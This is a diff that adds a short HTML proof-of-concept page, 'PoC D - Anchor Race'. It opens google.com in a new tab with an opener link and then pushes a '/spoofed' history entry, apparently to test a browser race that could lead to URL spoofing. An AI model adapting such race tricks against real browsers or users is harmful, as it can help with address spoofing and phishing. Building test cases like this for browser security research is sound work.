@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC D - Anchor Race</title>
+</head>
+<body>
+
+<h2>Anchor + pushState Race</h2>
+<button onclick="run()">Run</button>
+
+<script>
+const TARGET = "https://www.google.com";
+
+function run() {
+  const a = document.createElement("a");
+  a.href = TARGET;
+  a.target = "_blank";
+  a.rel = "opener";
+
+  document.body.appendChild(a);
+  a.click();
+
+  try {
+    history.pushState({}, "", "/spoofed");
+  } catch(e) {
+    console.log(e);
+  }
+
+  document.body.removeChild(a);
+}
+</script>
+
+</body>
+</html>
